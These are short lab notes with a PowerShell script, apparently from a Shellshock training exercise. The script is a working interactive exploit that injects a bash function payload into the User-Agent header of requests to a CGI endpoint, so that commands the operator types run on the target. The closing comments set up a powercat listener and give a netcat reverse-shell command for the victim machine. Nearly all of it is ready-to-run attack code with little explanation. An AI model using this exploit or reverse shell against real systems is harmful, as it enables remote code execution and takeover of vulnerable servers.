#Boot the machine for shellshock
#Go to web page
#Look at the source code
#see /cgi/bin
#duplicate this line: $http_request.setRequestHeader("Content-Length", $parameters.length);
#change content-length to User-Agent
#change $parameters.length to "() { :; }; /bin/bash -c 'ping -c 192.168.254.1' "

$cmd = ""
while($cmd -ne "exit")
{
    Write-Output "ShellShock> "
    $cmd = Read-Host
    function post_http ($url, $parameters) 
    {
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length);
        $http_request.setRequestHeader("User-Agent", "() { :; }; /bin/bash -c 'ping -c 1 192.168.37.1;$cmd' ");
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 
        $session=$http_request.responseText
        $session
    }
post_http http://192.168.37.129/cgi-bin/status 1 
}

#let the name be Invoke-shellshock.ps1


#fun stuff
#load powercat
#make it listen on port 4442
#. .\powercat.ps1
#powercat -l -v -p 4442

#victim machine
#nc 192.168.0.27 4442 -e /bin/sh